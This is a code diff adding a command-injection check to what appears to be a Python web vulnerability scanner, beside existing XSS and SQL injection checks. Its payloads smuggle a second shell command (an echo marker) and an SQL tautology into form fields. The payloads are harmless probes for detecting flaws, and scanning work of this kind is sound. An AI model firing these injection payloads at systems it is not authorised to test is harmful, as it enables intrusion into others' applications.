@@ -132,6 +132,22 @@ class XSS(FormAttack):
             print "Faille XSS non exploitable sur " + os.path.join(self.target.host, self.page)
             return False
 
+class CommandInjection(FormAttack):
+    PAYLOAD = "xxx  || echo 'COMMAND_INJECTION_WORK'"
+
+    def run(self, fieldname, fieldvalue = {}):
+
+        # Calling FormAttack run method
+        out = FormAttack.run(self, fieldname, fieldvalue)
+        if out == -1: return False    # If attack is aborted for any reason, it will return -1
+
+        if 'COMMAND_INJECTION_WORK' in out['data']:
+            print "Injection de commande exploitable sur " + os.path.join(self.target.host, self.page)
+            return True
+        else:
+            print "Injection de commande non exploitable sur " + os.path.join(self.target.host, self.page)
+            return False
+
 class SQLInjection(FormAttack):
     PAYLOAD = "' OR 1=1 #"
     TEST = ['\' OR SQL_INJECTION_WORK ; #', '" OR SQL_INJECTION_WORK ; #', ' OR SQL_INJECTION_WORK ; #']
